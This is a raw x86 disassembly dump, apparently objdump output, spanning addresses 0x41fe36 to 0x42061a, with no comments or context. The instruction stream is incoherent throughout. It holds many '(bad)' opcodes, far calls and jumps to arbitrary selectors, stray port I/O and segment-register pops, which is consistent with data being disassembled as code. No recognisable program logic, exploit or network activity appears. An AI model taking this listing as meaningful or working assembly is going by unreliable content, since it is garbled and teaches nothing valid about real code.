  41fe36:	retf   0x158
  41fe39:	or     dl,BYTE PTR [edx+0x2f]
  41fe3c:	mov    ch,bh
  41fe3e:	pop    esi
  41fe3f:	mov    BYTE PTR [esi+edi*2+0x49779b9d],dh
  41fe46:	mov    ds,WORD PTR [ecx-0x5a]
  41fe49:	test   ebx,edx
  41fe4b:	xchg   esi,eax
  41fe4c:	push   0xf9f0aaee
  41fe51:	es pop ds
  41fe53:	or     ecx,DWORD PTR [esi-0x556bf098]
  41fe59:	xchg   ebp,eax
  41fe5a:	jp     0x41fe32
  41fe5c:	mov    bh,0x4e
  41fe5e:	pop    ds
  41fe5f:	mov    eax,0x1702577a
  41fe64:	mov    esi,0x44e93fa0
  41fe69:	sbb    DWORD PTR [edi],0x8a79150d
  41fe6f:	mov    dl,0x10
  41fe71:	int3   
  41fe72:	rcl    esp,cl
  41fe74:	push   0x76374fd6
  41fe79:	pop    edx
  41fe7a:	push   cs
  41fe7b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fe7c:	mov    BYTE PTR [ebp-0x3f],ch
  41fe7f:	leave  
  41fe80:	lock mov ds:0x2f8f96a,al
  41fe86:	pop    edx
  41fe87:	push   ebp
  41fe88:	adc    edx,DWORD PTR [edx+0x17]
  41fe8b:	into   
  41fe8c:	xor    al,0x51
  41fe8e:	push   ds
  41fe8f:	mov    eax,ds:0x8bb673fe
  41fe94:	dec    esi
  41fe95:	and    eax,0xbcf099b4
  41fe9a:	dec    ecx
  41fe9b:	pop    esp
  41fe9c:	mov    cs,WORD PTR [ecx+0x4d]
  41fe9f:	into   
  41fea0:	js     0x41feef
  41fea2:	lods   al,BYTE PTR ds:[esi]
  41fea3:	rcl    BYTE PTR [edx-0x6a50f04],cl
  41fea9:	(bad)  
  41feaa:	pop    ecx
  41feab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41feac:	mov    al,0x19
  41feae:	push   ds
  41feaf:	mov    al,ds:0x2a61f7a
  41feb4:	fs sbb al,0xee
  41feb7:	das    
  41feb8:	add    DWORD PTR [esi-0x34],ebx
  41febb:	ror    BYTE PTR [ecx-0x6b9b10fc],cl
  41fec1:	jae    0x41fe66
  41fec3:	ss imul eax,edx,0x65d5ee6f
  41feca:	jo     0x41fef0
  41fecc:	cmp    al,0x8f
  41fecf:	out    0x61,eax
  41fed1:	add    esi,DWORD PTR [edx-0x19]
  41fed4:	sub    bh,dl
  41fed6:	imul   eax,esi,0xe11e3a06
  41fedc:	dec    edx
  41fedd:	mov    edx,0xe6ca4e55
  41fee2:	sbb    al,0xef
  41fee4:	adc    bh,dl
  41fee6:	pop    eax
  41fee7:	aad    0x65
  41fee9:	or     DWORD PTR [ebx+0x6d2869f0],eax
  41feef:	ret    0x5148
  41fef2:	pop    ds
  41fef3:	add    ecx,DWORD PTR [edx+ebp*1]
  41fef6:	rcl    DWORD PTR cs:[ebx+esi*4+0x74],0xd5
  41fefc:	xchg   edi,eax
  41fefd:	xchg   ecx,eax
  41fefe:	test   DWORD PTR ds:0x8dbbb3ba,ecx
  41ff04:	mov    bh,dh
  41ff06:	rcr    DWORD PTR [ebx-0x76],0x20
  41ff0a:	mov    ecx,0x66241e1a
  41ff0f:	xor    BYTE PTR ds:0x847e007,0xd5
  41ff16:	jno    0x41ff06
  41ff18:	mov    BYTE PTR [ebx],al
  41ff1a:	lods   al,BYTE PTR ds:[esi]
  41ff1b:	fisttp DWORD PTR [edx-0x4c1e4204]
  41ff21:	pop    ds
  41ff22:	xor    al,0x53
  41ff24:	dec    edx
  41ff25:	cli    
  41ff26:	dec    ebx
  41ff27:	cdq    
  41ff28:	mov    edx,esi
  41ff2a:	into   
  41ff2b:	cmp    al,0xff
  41ff2d:	xlat   BYTE PTR ds:[ebx]
  41ff2e:	test   eax,0xa4e79ca3
  41ff33:	aam    0x3f
  41ff35:	adc    ebp,esp
  41ff37:	lahf   
  41ff38:	frstor [esi]
  41ff3a:	pop    esp
  41ff3b:	rol    BYTE PTR [esi+edx*8-0x3deff121],1
  41ff42:	dec    ebx
  41ff43:	jge    0x41ff3d
  41ff45:	xchg   ebp,eax
  41ff46:	mov    cl,al
  41ff48:	mov    BYTE PTR [edi+0x34],bl
  41ff4b:	xchg   ecx,eax
  41ff4c:	cld    
  41ff4d:	xor    al,0xca
  41ff4f:	cli    
  41ff50:	leave  
  41ff51:	add    eax,0xe242621e
  41ff56:	pop    ss
  41ff57:	in     eax,dx
  41ff58:	leave  
  41ff59:	nop
  41ff5a:	push   edi
  41ff5b:	stc    
  41ff5c:	inc    edx
  41ff5d:	sbb    ebx,DWORD PTR [esi+0x1c9e3b6f]
  41ff63:	add    eax,0xf3ea05ea
  41ff68:	pop    ebx
  41ff69:	sbb    ch,BYTE PTR [edi+0x1d]
  41ff6c:	jl     0x41ffdf
  41ff6e:	pop    ds
  41ff6f:	inc    ebx
  41ff70:	repz dec ebx
  41ff72:	cmp    DWORD PTR [eax],esp
  41ff74:	jle    0x41ffbd
  41ff76:	inc    esp
  41ff77:	adc    al,0xe1
  41ff79:	add    dl,al
  41ff7b:	inc    ebx
  41ff7c:	outs   dx,DWORD PTR ds:[esi]
  41ff7d:	xor    al,BYTE PTR [ebp-0x7d]
  41ff80:	and    al,0x15
  41ff82:	call   0xa7a:0x471557b7
  41ff89:	sar    BYTE PTR [edi+0x647f0860],0xb9
  41ff90:	add    BYTE PTR [ecx],cl
  41ff92:	sub    al,0x2b
  41ff94:	leave  
  41ff95:	and    eax,0x34fefc1
  41ff9a:	fisttp WORD PTR [edx-0x32c1278]
  41ffa0:	mov    esi,0x4ab70539
  41ffa5:	hlt    
  41ffa6:	dec    ecx
  41ffa7:	aam    0xc7
  41ffa9:	neg    BYTE PTR [edx+0x4e]
  41ffac:	and    ch,0xba
  41ffaf:	push   ecx
  41ffb0:	lea    esi,[ebx-0x555656bb]
  41ffb6:	in     eax,0x55
  41ffb8:	mov    ebp,cs
  41ffba:	mov    bh,0xd5
  41ffbc:	sub    eax,esp
  41ffbe:	dec    esp
  41ffbf:	lea    edi,[esi-0x6c]
  41ffc2:	mov    eax,0x6319b2a4
  41ffc7:	push   cs
  41ffc8:	or     al,cl
  41ffca:	cli    
  41ffcb:	into   
  41ffcc:	call   0x9802:0x2ecc24c5
  41ffd3:	mov    ch,BYTE PTR [ebp-0x30]
  41ffd6:	jmp    0x1ff2a12f
  41ffdb:	stos   DWORD PTR es:[edi],eax
  41ffdc:	cmp    BYTE PTR [ebp-0x7],0x81
  41ffe0:	push   ss
  41ffe1:	sbb    eax,0xef3d546
  41ffe6:	loop   0x41ff72
  41ffe8:	pop    ds
  41ffe9:	mov    esp,DWORD PTR [eax+0x42298b4a]
  41ffef:	ret    
  41fff0:	popf   
  41fff1:	xor    eax,0x960971bc
  41fff6:	sbb    ah,BYTE PTR [eax+0x26]
  41fff9:	not    BYTE PTR [edx]
  41fffb:	mov    ebx,0x7e412d8b
  420000:	iret   
  420001:	push   esp
  420002:	cmp    esi,DWORD PTR [edi]
  420004:	ins    DWORD PTR es:[edi],dx
  420005:	jns    0x41ffe5
  420007:	sub    ah,al
  420009:	jmp    0x420068
  42000b:	sub    eax,0x84e14ca9
  420010:	fistp  DWORD PTR [ecx]
  420012:	jne    0x420039
  420014:	jo     0x41ffd7
  420016:	inc    ebx
  420017:	shr    BYTE PTR [eax],cl
  420019:	js     0x42001a
  42001b:	or     ch,BYTE PTR [ebx+esi*2]
  42001e:	mov    bl,0xd2
  420020:	or     DWORD PTR [ebx],ecx
  420022:	ins    BYTE PTR es:[edi],dx
  420023:	ja     0x41ffde
  420025:	dec    edi
  420026:	js     0x41ffc6
  420028:	sub    eax,0xca95e994
  42002d:	jmp    0x3c95:0x6d95d497
  420034:	xchg   DWORD PTR [eax],edi
  420036:	mov    ecx,0x59e989cc
  42003b:	fs xchg edi,eax
  42003d:	sbb    eax,0x227d48a
  420042:	push   0x1
  420044:	nop
  420045:	lock or BYTE PTR [ecx],ch
  420048:	inc    BYTE PTR [ecx]
  42004a:	pop    ds
  42004b:	stos   DWORD PTR es:[edi],eax
  42004c:	dec    ebx
  42004d:	clc    
  42004e:	inc    edx
  42004f:	fild   QWORD PTR [ecx+ebx*8+0x5c]
  420053:	aad    0x36
  420055:	jg     0x420000
  420057:	jge    0x41ffdc
  420059:	xchg   edx,eax
  42005a:	dec    edi
  42005b:	aad    0x88
  42005d:	fwait
  42005e:	out    dx,al
  42005f:	repz adc eax,0x99d6fc15
  420065:	data16 shl dl,0x45
  420069:	add    ah,dl
  42006b:	mov    eax,ds:0xbdf76f63
  420070:	and    bh,0x6a
  420073:	jae    0x4200e7
  420075:	cmp    DWORD PTR [esi],ebx
  420077:	add    al,0x6c
  420079:	hlt    
  42007a:	jmp    0x420052
  42007c:	inc    edx
  42007d:	daa    
  42007e:	fnsave [edi+0x2573bce8]
  420084:	push   ecx
  420085:	push   esi
  420086:	pop    ds
  420087:	out    dx,eax
  420088:	ja     0x420023
  42008a:	dec    ecx
  42008b:	xor    DWORD PTR [esi],ecx
  42008d:	rcr    DWORD PTR [edi+edx*8],1
  420090:	jg     0x4200a4
  420092:	or     esp,ebp
  420094:	mov    al,0x94
  420096:	mov    ecx,0x9bbf8903
  42009b:	or     BYTE PTR [edx+0xa7af4e7],dh
  4200a1:	jecxz  0x420027
  4200a3:	mov    edx,0xfb08db8f
  4200a8:	or     BYTE PTR [eax+0xae1c94e],bh
  4200ae:	pop    edx
  4200af:	jne    0x420062
  4200b1:	jo     0x4200d1
  4200b3:	mov    cl,0x61
  4200b5:	es jo  0x42007d
  4200b8:	add    BYTE PTR ds:0x324e0230,0xe7
  4200bf:	jb     0x4200fe
  4200c1:	pop    ds
  4200c2:	gs cdq 
  4200c4:	hlt    
  4200c5:	test   al,0xd3
  4200c7:	mov    ecx,0x7470f2a1
  4200cc:	mov    esi,0x64d8aa02
  4200d1:	fadd   QWORD PTR [edx+edi*1]
  4200d4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4200d5:	or     DWORD PTR [edi],ebx
  4200d7:	dec    ebp
  4200d8:	pop    ebp
  4200d9:	stc    
  4200da:	test   dh,dl
  4200dc:	pop    esp
  4200dd:	jo     0x420148
  4200df:	aad    0x59
  4200e1:	outs   dx,DWORD PTR ds:[esi]
  4200e2:	lahf   
  4200e3:	push   edi
  4200e4:	jo     0x4200be
  4200e6:	mov    ds:0x9cab8845,eax
  4200eb:	adc    BYTE PTR [esi+0x6c],bh
  4200ee:	das    
  4200ef:	add    BYTE PTR [esi],bh
  4200f1:	add    bl,BYTE PTR [ebx+ebp*8+0x37]
  4200f5:	sbb    al,0xfe
  4200f7:	cmp    dl,al
  4200f9:	mov    cl,0x8f
  4200fb:	mov    cl,0x1d
  4200fd:	push   0xffffff89
  4200ff:	mov    BYTE PTR ds:[edx-0x2c],bh
  420103:	jno    0x420113
  420105:	mov    dl,0x91
  420107:	mov    eax,0xa8d4cc19
  42010c:	and    eax,0x7f838003
  420111:	push   cs
  420112:	(bad)  
  420114:	je     0x420107
  420116:	pusha  
  420117:	icebp  
  420118:	repz push 0x96746ddd
  42011e:	not    esp
  420120:	push   ebx
  420121:	adc    al,0x6
  420123:	aad    0x14
  420125:	(bad)  
  420126:	jg     0x4200e1
  420128:	mov    BYTE PTR [ebx-0x77362f1f],bh
  42012e:	xor    BYTE PTR [esi-0x68],0x1c
  420132:	in     al,0x8f
  420134:	push   ebp
  420135:	dec    esp
  420136:	sub    bh,ch
  420138:	push   0x8981d4ad
  42013d:	cmp    DWORD PTR [edi-0x74],esi
  420140:	ins    DWORD PTR es:[edi],dx
  420141:	jecxz  0x42013a
  420143:	or     BYTE PTR [edx+eax*1],dh
  420146:	dec    edx
  420147:	ja     0x4201bf
  420149:	sbb    ah,bh
  42014b:	and    ebp,DWORD PTR [edi]
  42014d:	xchg   ecx,eax
  42014e:	pusha  
  42014f:	xchg   ebx,eax
  420150:	stos   BYTE PTR es:[edi],al
  420151:	dec    edi
  420152:	jp     0x420123
  420154:	sub    al,0x3
  420156:	dec    edi
  420157:	mov    eax,0x772ce044
  42015c:	aam    0x96
  42015e:	pop    ds
  42015f:	nop
  420160:	pop    edi
  420161:	sub    BYTE PTR [edx+ebp*1-0x78],bh
  420165:	push   ebx
  420166:	pop    esi
  420167:	mov    dh,0xf1
  420169:	into   
  42016a:	mov    bl,cl
  42016c:	cmp    bh,BYTE PTR cs:[edx+0x32]
  420170:	inc    ebp
  420171:	sub    al,0x1f
  420173:	in     eax,dx
  420174:	cwde   
  420175:	xchg   edx,eax
  420176:	jle    0x420190
  420178:	ss das 
  42017a:	pop    ds
  42017b:	jns    0x420139
  42017d:	xor    dl,cl
  42017f:	add    BYTE PTR [edx],cl
  420181:	mov    dl,0xb0
  420183:	rol    DWORD PTR ds:0x238989a8,cl
  420189:	inc    esp
  42018a:	add    BYTE PTR [edi+0x52],cl
  42018d:	mov    dl,0x34
  42018f:	ret    0x988
  420192:	ret    0xebed
  420195:	leave  
  420196:	mov    edx,ebp
  420198:	retf   0xb2d1
  42019b:	mov    ecx,DWORD PTR [edx+0x1ad1a3a4]
  4201a1:	push   edi
  4201a2:	out    dx,al
  4201a3:	adc    eax,0x1c143e09
  4201a8:	mov    BYTE PTR [ebp+0x74f586c6],dh
  4201ae:	jecxz  0x420212
  4201b0:	popf   
  4201b1:	add    eax,0xc4daaaa4
  4201b6:	sbb    eax,0x1fb1f3b6
  4201bb:	jno    0x42019d
  4201bd:	fidiv  WORD PTR [edi+0x6a]
  4201c0:	je     0x42023a
  4201c2:	cdq    
  4201c3:	pushf  
  4201c4:	jg     0x42023c
  4201c6:	pop    ss
  4201c7:	push   edi
  4201c8:	push   ecx
  4201c9:	sbb    DWORD PTR [edi+ebp*2-0x6ae0a51a],0xffffffab
  4201d1:	ins    BYTE PTR es:[edi],dx
  4201d2:	adc    eax,0x4b832ead
  4201d7:	mov    edx,0xcd1a0f1a
  4201dc:	mov    dl,cl
  4201de:	push   0x1f334ae0
  4201e3:	lods   eax,DWORD PTR ds:[esi]
  4201e4:	jg     0x42025b
  4201e6:	cwde   
  4201e7:	jcxz   0x4201bf
  4201ea:	lahf   
  4201eb:	inc    eax
  4201ec:	ret    
  4201ed:	inc    esp
  4201ee:	pop    ds
  4201ef:	cdq    
  4201f0:	mov    ebp,0x9c09f77e
  4201f5:	mov    ah,0x68
  4201f7:	mov    ch,0xa8
  4201f9:	xor    bl,BYTE PTR [eax-0xeb176a3]
  4201ff:	retf   0x2d4
  420202:	js     0x42023e
  420204:	mov    ebx,0x2de03e1e
  420209:	mov    eax,0xf9642560
  42020e:	xor    BYTE PTR [ebx+0x4a],dl
  420211:	(bad)  
  420212:	jge    0x4201e8
  420214:	lahf   
  420215:	add    BYTE PTR [edx-0x30],0xe6
  420219:	call   FWORD PTR [ebp-0x7c]
  42021c:	dec    eax
  42021d:	ins    DWORD PTR es:[edi],dx
  42021e:	push   ds
  42021f:	rol    ebp,0xd0
  420222:	pop    ss
  420223:	mov    DWORD PTR [esi+0x20d7e3ae],eax
  420229:	mov    esp,0x5900736e
  42022e:	add    DWORD PTR [ebp+eax*2-0x3ff69f1c],edx
  420235:	fisub  WORD PTR [edi]
  420237:	mov    eax,ds:0xd23bb0fa
  42023c:	loop   0x4201e2
  42023e:	js     0x420272
  420240:	dec    ecx
  420241:	(bad)  
  420243:	test   BYTE PTR [ecx],ah
  420245:	rcr    BYTE PTR [edi],1
  420247:	gs sub al,0x7e
  42024a:	jg     0x42023e
  42024c:	pushf  
  42024d:	lods   eax,DWORD PTR ds:[esi]
  42024e:	in     al,0xd4
  420250:	retf   
  420251:	dec    esp
  420252:	pop    es
  420253:	jmp    0x5789:0x7e3a1cbc
  42025a:	inc    esp
  42025b:	sub    al,0x4a
  42025d:	ins    BYTE PTR es:[edi],dx
  42025e:	fdivr  st(3),st
  420260:	push   ds
  420261:	add    ecx,esp
  420263:	adc    al,0x12
  420265:	jmp    0xd36e:0xbf578148
  42026c:	jecxz  0x420240
  42026e:	mov    ds:0x1c46d5ba,eax
  420273:	xlat   BYTE PTR ds:[ebx]
  420274:	pop    edx
  420275:	addr16 out 0x9c,al
  420278:	and    ch,BYTE PTR ds:0x4a34d40c
  42027e:	mov    ebp,DWORD PTR [esi+0x688c6bb3]
  420284:	jo     0x420218
  420286:	push   ss
  420287:	call   esi
  420289:	out    dx,eax
  42028a:	pop    esp
  42028b:	mov    ebp,0x381f9811
  420290:	pop    esi
  420291:	aam    0x4
  420293:	mov    ebp,0xce3002b5
  420298:	cld    
  420299:	aad    0x2d
  42029b:	or     al,0xd7
  42029d:	xor    ebp,DWORD PTR [ebp+0x65]
  4202a0:	sbb    eax,0x4d39844d
  4202a5:	sub    dh,bh
  4202a7:	aad    0xc7
  4202a9:	push   0x4f
  4202ab:	xor    esi,DWORD PTR [eax-0x523c2dfe]
  4202b1:	call   0xcba9:0xa7827391
  4202b8:	sbb    dl,dh
  4202ba:	rcl    DWORD PTR ds:0xb3f40253,cl
  4202c0:	mov    edi,0xe70acb35
  4202c5:	mov    DWORD PTR [edi],ebx
  4202c7:	push   ebp
  4202c8:	int3   
  4202c9:	pop    es
  4202ca:	and    eax,0xe6fb0847
  4202cf:	test   dh,ah
  4202d1:	jle    0x420328
  4202d3:	xor    DWORD PTR fs:[eax+0x2e14bd0],0x34961f3a
  4202de:	sub    al,0xf4
  4202e0:	test   eax,0x89c6a671
  4202e5:	sahf   
  4202e6:	mov    al,ds:0x74da7efc
  4202eb:	call   0xcd67dc79
  4202f0:	mov    cl,0x37
  4202f2:	(bad)  
  4202f3:	pop    esi
  4202f4:	dec    ecx
  4202f5:	and    al,0xba
  4202f7:	cmp    esp,DWORD PTR [ebx]
  4202f9:	pusha  
  4202fa:	pop    edi
  4202fb:	dec    esi
  4202fc:	imul   edi,DWORD PTR [ebp-0x78],0x2b5988b2
  420303:	outs   dx,BYTE PTR ds:[esi]
  420304:	pop    es
  420305:	and    eax,0xdb400d56
  42030a:	add    al,0xd7
  42030c:	dec    ecx
  42030d:	mov    bh,0x55
  42030f:	mov    eax,0xb7f53410
  420314:	call   0xf502:0xda6573ed
  42031b:	dec    ecx
  42031c:	fs (bad) 
  42031e:	mov    ds:0x9f9ec8b9,al
  420323:	push   ds
  420324:	leave  
  420325:	pop    ds
  420326:	(bad)  
  420327:	(bad)  
  420328:	xchg   esp,eax
  420329:	sbb    al,0x2
  42032b:	in     al,dx
  42032c:	mov    DWORD PTR [ecx-0x71c53a6e],edi
  420332:	mov    ecx,DWORD PTR ds:0xde0033b
  420338:	cld    
  420339:	xor    BYTE PTR [edi],ch
  42033b:	jecxz  0x4202cc
  42033d:	(bad)  
  42033e:	pusha  
  42033f:	cdq    
  420340:	mov    BYTE PTR [ecx-0x43],0xa0
  420344:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420346:	add    bh,dl
  420348:	jecxz  0x42034a
  42034a:	mov    bh,0x12
  42034c:	pop    ebx
  42034d:	fimul  WORD PTR fs:[ebx-0xb]
  420351:	jge    0x420300
  420353:	call   0x16f1:0x99f69d5c
  42035a:	stos   BYTE PTR es:[edi],al
  42035b:	pop    ds
  42035c:	mov    ah,0x1c
  42035e:	out    dx,al
  42035f:	and    BYTE PTR ds:0x9b9e7fb,ch
  420365:	popa   
  420366:	jg     0x4203ab
  420368:	mov    DWORD PTR [ebp-0x5ea208bf],eax
  42036e:	sahf   
  42036f:	sbb    al,BYTE PTR [ebx+0x41ae2849]
  420375:	cmp    BYTE PTR [ecx-0x15d24563],0xc
  42037c:	mov    DWORD PTR [edi],esp
  42037e:	inc    dx
  420380:	push   ebx
  420381:	sbb    dl,BYTE PTR [edx]
  420383:	cmp    BYTE PTR [esi],ch
  420385:	sbb    DWORD PTR [eax-0x641f3f6e],edx
  42038b:	arpl   WORD PTR [esi-0x76270d90],ax
  420391:	pop    edi
  420392:	ffreep st(1)
  420394:	push   ds
  420395:	test   al,0x87
  420397:	aad    0x7c
  420399:	jae    0x420418
  42039b:	xor    BYTE PTR [edx-0x4c0c60e9],0xb3
  4203a2:	les    ebx,FWORD PTR [ebx+0x1e60ac34]
  4203a8:	imul   esp,DWORD PTR [edi+0x2a6c9cd],0x32
  4203af:	pop    ss
  4203b0:	mov    ebx,DWORD PTR [edx]
  4203b2:	add    eax,0x1f139ace
  4203b7:	mov    bh,0x9e
  4203b9:	pop    esi
  4203ba:	and    ecx,edi
  4203bc:	jb     0x4203e4
  4203be:	ja     0x4203a5
  4203c0:	fld    QWORD PTR [edx]
  4203c2:	dec    esp
  4203c3:	out    0x56,eax
  4203c5:	adc    eax,0x4375d312
  4203ca:	push   ds
  4203cb:	and    edi,ecx
  4203cd:	xchg   esi,eax
  4203ce:	js     0x4203fe
  4203d0:	and    BYTE PTR [ebx+0xded4ce],ch
  4203d6:	fcomp  QWORD PTR [eax-0x4b]
  4203d9:	adc    al,0xf6
  4203db:	pop    ecx
  4203dc:	mov    ebp,edi
  4203de:	add    al,ah
  4203e0:	push   ss
  4203e1:	sbb    DWORD PTR [esi-0x3bf4be08],0xea7de469
  4203eb:	aad    0x80
  4203ed:	push   ebp
  4203ee:	nop
  4203ef:	and    DWORD PTR [edx],edi
  4203f1:	xor    ebx,DWORD PTR [esi]
  4203f3:	jmp    0x420441
  4203f5:	add    ah,ah
  4203f7:	out    0xe0,eax
  4203f9:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4203fb:	stos   BYTE PTR es:[edi],al
  4203fc:	push   esi
  4203fd:	pop    es
  4203fe:	call   0xd8a0:0xcd259772
  420405:	imul   ebx,DWORD PTR [ebx+0x1b],0x609e3837
  42040c:	(bad)  
  42040d:	mov    cl,0xc0
  42040f:	push   es
  420410:	push   es
  420411:	add    dh,BYTE PTR [edx+esi*4+0x564c3304]
  420418:	repz xor DWORD PTR [esi+0x1fa48f55],esi
  42041f:	xchg   edi,eax
  420420:	addr16 ss add edx,esp
  420424:	jmp    DWORD PTR [esi]
  420426:	stos   BYTE PTR es:[edi],al
  420427:	xlat   BYTE PTR ds:[ebx]
  420428:	push   0x4f6bde53
  42042d:	lock out dx,al
  42042f:	xchg   esp,eax
  420430:	mov    DWORD PTR [ecx+0x3ed5f447],esp
  420436:	lahf   
  420437:	loope  0x420478
  420439:	xor    DWORD PTR [ebx+edx*4-0x221a15d8],ebp
  420440:	test   eax,0xfcaf1f04
  420445:	inc    ebp
  420446:	push   eax
  420447:	aaa    
  420448:	mov    ch,0x8b
  42044a:	pop    eax
  42044b:	leave  
  42044c:	adc    eax,DWORD PTR [ebx]
  42044e:	stos   BYTE PTR es:[edi],al
  42044f:	aam    0xd
  420451:	ja     0x42041f
  420453:	push   0x6f
  420455:	xchg   edi,eax
  420456:	or     DWORD PTR [edx+0x26101b86],ebp
  42045c:	lahf   
  42045d:	and    BYTE PTR [eax+0x22c468d1],0xd4
  420464:	mov    esi,0xfaf5c7d1
  420469:	ins    DWORD PTR es:[edi],dx
  42046a:	pop    esi
  42046b:	nop
  42046c:	fwait
  42046d:	xlat   BYTE PTR ds:[ebx]
  42046e:	arpl   WORD PTR [ecx],ax
  420470:	cmp    al,0xf7
  420472:	fcmovbe st,st(5)
  420474:	inc    esp
  420475:	clc    
  420476:	dec    ebx
  420477:	mov    ah,0x5f
  420479:	jbe    0x42048e
  42047b:	lods   eax,DWORD PTR ds:[esi]
  42047c:	lds    ebx,FWORD PTR [ebx+0x13]
  42047f:	and    ah,BYTE PTR [ebp+0x57156d4d]
  420485:	fs jle 0x42049a
  420488:	adc    BYTE PTR [edx+0x4d],ch
  42048b:	aam    0xcc
  42048d:	and    ebx,DWORD PTR [eax-0x44ccd778]
  420493:	(bad)  
  420495:	pop    ecx
  420496:	or     al,0xd7
  420498:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420499:	pop    ds
  42049a:	js     0x4204ce
  42049c:	mov    cl,0xdb
  42049e:	rcr    ah,1
  4204a0:	mov    BYTE PTR [edx],al
  4204a2:	jo     0x42045b
  4204a4:	sub    DWORD PTR [esi],ebx
  4204a6:	or     BYTE PTR [esi+ebp*2],ch
  4204a9:	push   edx
  4204aa:	pop    ds
  4204ab:	test   DWORD PTR [edi-0x22],edx
  4204ae:	test   DWORD PTR [edi-0x2edb050a],edi
  4204b4:	sbb    al,0x28
  4204b6:	push   0x3c2d1ada
  4204bb:	daa    
  4204bc:	ror    DWORD PTR [esi+ebx*1+0x7b],cl
  4204c0:	rcl    DWORD PTR [eax+0x65],0xe7
  4204c4:	cmp    bh,ch
  4204c6:	xor    eax,0x9651e0b5
  4204cb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4204cc:	(bad)  
  4204cd:	daa    
  4204ce:	cmp    DWORD PTR [edi+0x26],esi
  4204d1:	fs popa 
  4204d3:	push   esp
  4204d4:	mov    es,WORD PTR [edi-0x1d]
  4204d7:	mov    bh,0x5a
  4204d9:	xchg   edi,eax
  4204da:	cld    
  4204db:	adc    eax,0xdb409bf3
  4204e0:	ins    DWORD PTR es:[edi],dx
  4204e1:	add    esi,DWORD PTR [edx-0x34]
  4204e4:	xchg   edi,eax
  4204e5:	sti    
  4204e6:	inc    ecx
  4204e7:	sub    ch,0x1f
  4204ea:	pop    ds
  4204eb:	ror    DWORD PTR [ebx],1
  4204ed:	inc    ebx
  4204ee:	js     0x4204f5
  4204f0:	dec    edx
  4204f1:	repz adc esp,0xffffff9e
  4204f5:	xchg   BYTE PTR [ebp+0x63],ah
  4204f8:	lock xor al,0xbf
  4204fb:	push   es
  4204fc:	xchg   DWORD PTR [edi+0x71ba5d99],esp
  420502:	push   DWORD PTR [edi-0x48]
  420505:	add    al,0xf0
  420507:	stos   DWORD PTR es:[edi],eax
  420508:	pop    ebx
  420509:	inc    ecx
  42050a:	into   
  42050b:	mov    ebx,0x880f76f0
  420510:	nop
  420511:	xlat   BYTE PTR ds:[ebx]
  420512:	lock movs BYTE PTR es:[di],BYTE PTR ds:[si]
  420515:	push   esi
  420516:	jno    0x420529
  420518:	dec    ebx
  420519:	add    edx,DWORD PTR [edx]
  42051b:	mov    ebx,0x94317251
  420520:	(bad)  
  420521:	cld    
  420522:	ins    DWORD PTR es:[edi],dx
  420523:	xor    eax,DWORD PTR [esi]
  420525:	out    0xcd,eax
  420527:	pusha  
  420528:	or     BYTE PTR [eax+0x224ce1f],dl
  42052e:	jl     0x42057a
  420530:	mov    ch,0x14
  420532:	ins    DWORD PTR es:[edi],dx
  420533:	pop    ebp
  420534:	enter  0x1fa5,0x6f
  420538:	pop    edi
  420539:	add    eax,0x719437a4
  42053e:	mov    eax,ds:0x7f3142a7
  420543:	add    ecx,DWORD PTR [ecx+0x68e9cc4e]
  420549:	int    0x1f
  42054b:	xchg   ebp,eax
  42054c:	out    dx,eax
  42054d:	push   eax
  42054e:	(bad)  
  42054f:	stos   BYTE PTR es:[edi],al
  420550:	retf   0xf39f
  420553:	aam    0x24
  420555:	call   0xc61d:0xacc49082
  42055c:	rcl    BYTE PTR [ebx+0x1884134],0x85
  420563:	ret    0xb55b
  420566:	or     eax,0x60e3d555
  42056b:	dec    ebx
  42056c:	pop    ecx
  42056d:	dec    ebp
  42056e:	mov    bl,0xe0
  420570:	jecxz  0x4205bd
  420572:	pop    ds
  420573:	test   ecx,eax
  420575:	jecxz  0x42052a
  420577:	jnp    0x42053f
  420579:	cmp    al,0xd6
  42057b:	fcom   QWORD PTR ds:0x96cf52e7
  420581:	add    cl,BYTE PTR [edx-0x293a5232]
  420587:	test   eax,0x2156156d
  42058c:	repnz outs dx,DWORD PTR ds:[esi]
  42058e:	ret    0x8895
  420591:	jecxz  0x420538
  420593:	sbb    eax,0xd55556e0
  420598:	sbb    edi,DWORD PTR [edx+0x4c]
  42059b:	sti    
  42059c:	xchg   edx,eax
  42059d:	test   al,0x23
  42059f:	mov    cl,0x69
  4205a1:	aas    
  4205a2:	ds mov BYTE PTR gs:[ebx-0x50869882],dh
  4205aa:	push   edx
  4205ab:	add    ecx,DWORD PTR [edi]
  4205ad:	add    ebp,DWORD PTR [esi-0x9d9b6ca]
  4205b3:	mov    bh,0x25
  4205b5:	icebp  
  4205b6:	pusha  
  4205b7:	xchg   ecx,eax
  4205b8:	jmp    0x420543
  4205ba:	popf   
  4205bb:	fsubr  QWORD PTR [ebx-0x5a]
  4205be:	jmp    0x420603
  4205c0:	xchg   ebx,eax
  4205c1:	push   ss
  4205c2:	push   ds
  4205c3:	jns    0x4205f6
  4205c5:	sbb    al,BYTE PTR [edx-0x4]
  4205c8:	mov    ah,0x33
  4205ca:	popa   
  4205cb:	(bad)  [esi-0x71]
  4205ce:	out    dx,al
  4205cf:	test   BYTE PTR [eax],ch
  4205d1:	push   cs
  4205d2:	pop    es
  4205d3:	pcmpgtd mm0,QWORD PTR [ebx]
  4205d6:	cwde   
  4205d7:	cld    
  4205d8:	sbb    eax,0x464a7a30
  4205dd:	sbb    DWORD PTR [edi],0x8efb7f77
  4205e3:	test   BYTE PTR [esi+0x73d71751],cl
  4205e9:	dec    esp
  4205ea:	sbb    dh,BYTE PTR [ebx]
  4205ec:	pop    edi
  4205ed:	sbb    ebp,DWORD PTR [ebp+0x6d7a6092]
  4205f3:	lea    ebp,[edi-0x719c733e]
  4205f9:	int    0x1a
  4205fb:	ret    0x4ff6
  4205fe:	mov    bl,0xc5
  420600:	or     al,0x5f
  420602:	retf   
  420603:	aam    0x8
  420605:	cmp    al,0xa9
  420607:	sub    BYTE PTR [esi+edx*8],dh
  42060a:	add    ecx,DWORD PTR [edi+0x3a7e55a0]
  420610:	and    eax,0xf7415e15
  420615:	(bad)  
  420616:	jg     0x420606
  420618:	mov    al,0x79
  42061a:	mov    bh,0xd3
